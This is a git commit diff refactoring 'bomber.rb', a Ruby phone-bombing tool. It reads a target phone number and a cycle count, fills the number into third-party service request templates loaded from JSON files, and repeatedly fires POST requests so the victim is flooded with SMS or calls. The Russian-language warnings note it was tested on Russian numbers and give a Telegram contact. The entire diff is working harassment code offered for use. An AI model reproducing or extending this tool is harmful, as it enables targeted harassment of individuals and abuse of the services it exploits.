84b841395d757cad5a143d2842e6097b482d2fdf
akella122 <50542103+AlianaBasil@users.noreply.github.com>
2021-03-07 22:13:29 +0400

    ver 2

--- bomber.rb
+++ bomber.rb
@@ -1,93 +1,96 @@
-require "net/http"
-require "net/https"
-require "json"
+# frozen_string_literal: true
 
-show_responce = true
+require 'net/http'
+require 'net/https'
+require 'json'
 
-puts "Внимание! Бомбер тестировался только с российскими номерами, нет возможности с украинскими. При возникновении любых ошибок пишите t.me/ursna1"
+def main
+  response = config('response')
+  json = config('json')
+  debug = config('debug')
+  put_debug "Show response: #{response}, show jsons: #{json}, debug: #{debug}"
 
-print "Введите номер с +: "
-phone = gets
-phone = phone.gsub "\n", ""
-phone_np = phone.sub "+", ""
- 
-print "Введите количество проходов: "
-cycles = gets.to_i
+  put_warning 'Бомбер тестировался только с российскими номерами, нет возможности проверить с украинскими'
+  put_warning 'При возникновении любых ошибок пишите t.me/ursna1'
 
-method = []
-name = []
-body = []
-url = []
-kwph = [] 
+  phone = input('Введите номер(Пример: +796...): ').strip
+  # phone without plus
+  phone_np = phone.sub('+', '') if phone.include? '+'
 
-services = Dir["services/*.json"]
+  cycles = input('Введите количество проходов: ').to_i
+  put_debug "Phone: #{phone}, Phone without plus: #{phone_np}, cycles: #{cycles}"
 
-services.size.times do |i|
-  file = File.read services[i]
-  services[i] = JSON.parse(file)
-  
-  method[i] = services[i]["method"]
-  name[i] = services[i]["name"]
-  url[i] = services[i]["url"]
-  body[i] = services[i]["body"]
-  kwph[i] = services[i]["key_with_phone"]
+  # get list services
+  services = Dir['services/*.json']
+  put_debug "Services paths: #{services}"
 
-  case method[i]
-  when "post_json"
-  
-    case body[i][kwph[i]]
-    when "$phone_np"
-      body[i][kwph[i]] = body[i][kwph[i]].sub "$phone_np", " #{phone_np}"
-    when "$phone"
-      body[i][kwph[i]] = body[i][kwph[i]].sub "$phone", "#{phone}"
-    else
-      puts "Ошибка подстановки номера. Проверьте сервис #{name[i]}"
-      exit()
-    end
-    
-  when "post"
-  
-    if url[i]["$phone_np"]
-      url[i] = url[i].gsub "$phone_np", "#{phone_np}"
-    elsif url[i]["$phone"]
-      url[i] = url[i].gsub "$phone", phone
-    else
-      puts "Ошибка подстановки номера. Проверьте сервис #{name[i]}"
-      exit()
-    end
-    
-  else
-    puts "Ошибка подстановки номера. Проверьте сервис #{name[i]}"
-    exit()
-    
-  end
-    
-end
-
-puts "Сервисов: #{services.size}"
-
-for x in 1..cycles
-  puts "Начинаю #{x} проход"
+  # check all services
   services.size.times do |i|
-    uri = URI.parse(url[i])
-    https = Net::HTTP.new(uri.host,uri.port)
-    https.use_ssl = true
-    request = Net::HTTP::Post.new(uri.path)
-    if method[i] = "post_json"
-      request['Content-Type'] = 'application/json'
-      request.body = body[i].to_json
+    # get all jsons
+    services[i] = File.read services[i]
+    services[i] = JSON.parse services[i]
+    services[i] = substitute(services[i], '$phone', phone)
+    put_debug "Service json: #{services[i]}"
+    puts services[i]
+  end
+
+  (1..cycles).each do |x|
+    put_debug "Начинаю #{x} проход"
+    services.size.times do |i|
+      bomber(services[i], response)
     end
-    result = https.request request
-    
-    if show_responce
-      if result.body.size > 100
-        puts "Запрос к #{name[i]} отправлен, ответ:"
-        puts result
-      else
-        puts "Запрос к #{name[i]} отправлен, ответ:"
-        puts result.body
-      end
-    end
-    
   end
 end
+
+def config(key)
+  c = File.read 'config.json'
+  c = JSON.parse c
+  c[key]
+end
+
+def input(msg)
+  print "\033[35m[Input] \033[0m#{msg}"
+  gets
+end
+
+def put_anything(msg)
+  puts "\033[34m[Output] \033[0m#{msg}"
+end
+
+def put_debug(msg)
+  puts "\033[36m[Debug] \033[0m#{msg}" if config('debug')
+end
+
+def put_warning(msg)
+  puts "\033[31m[Warning] \033[0m#{msg}"
+end
+
+def substitute(hash, target, new_value)
+  hash.each do |key, value|
+    hash[key] = new_value if value == target
+    substitute(value, target, new_value) if value.is_a?(Hash)
+  end
+  hash
+end
+
+def bomber(hsh, response)
+  uri = URI.parse(hsh['url'])
+  https = Net::HTTP.new(uri.host, uri.port)
+  https.use_ssl = true
+  request = Net::HTTP::Post.new(uri.path)
+  if hsh['params'].include? '$json'
+    request['Content-Type'] = 'application/json'
+    request.body = hsh['body'].to_json
+  end
+  result = https.request request
+  if response
+    if result.body.size > 250
+      put_anything "#{hsh['name']} response code: #{result.code}"
+    else
+      put_anything "#{hsh['name']} response: #{result.body}"
+    end
+  end
+end
+
+
+main
